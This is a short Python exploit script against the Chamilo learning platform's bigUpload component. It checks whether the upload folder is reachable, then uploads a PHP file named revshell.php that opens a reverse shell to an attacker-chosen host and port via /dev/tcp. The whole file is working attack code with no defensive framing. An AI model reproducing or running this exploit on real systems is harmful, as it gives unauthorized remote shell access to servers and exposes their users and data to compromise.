import requests
from typing import Union


class ChamiloBigUploadExploit:
    def __init__(self, url: str, action: str) -> None:
        self.root_url = url


    def check_target_vulnerable(self) -> bool:
        response = requests.get(f'{self.root_url}/main/inc/lib/javascript/bigupload/files/')

        if response.status_code == 200:
            return True
        else:
            return False
        
    
    def send_revshell(self, host: str, port: int) -> None:
        revshell_content = f'<?php system("sh -i >& /dev/tcp/{host}/{port} 0>&1")?>'

        response = requests.post(
            f'{self.root_url}/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported',
            files={
                'bigUploadFile': ('revshell.php', revshell_content)
            }
        )

        print(response.text)